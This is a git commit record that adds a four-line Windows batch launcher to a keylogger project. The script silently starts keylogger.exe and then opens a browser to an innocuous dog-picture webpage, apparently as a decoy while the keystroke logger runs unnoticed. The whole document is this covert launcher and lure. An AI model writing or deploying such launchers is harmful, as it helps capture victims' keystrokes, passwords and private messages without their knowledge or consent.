071cd652aa05607ef67c4d9570807832ee20f375
kapz28 <KaSatkunanathan@gmail.com>
2018-03-08 23:10:54 -0500

    Add files via upload

---
+++ keylogger/launch.bat
@@ -0,0 +1,4 @@
+@echo off
+start "" "C:\Users\kapz\Desktop\keylogger\keylogger.exe"
+SET BROWSER=chrome.exe
+start http://dutchman.me/a-picture-of-a-dog/a-picture-of-dog-2-nice-design-ideas-what-is-my-trying-to-tell-me-modern-magazine/
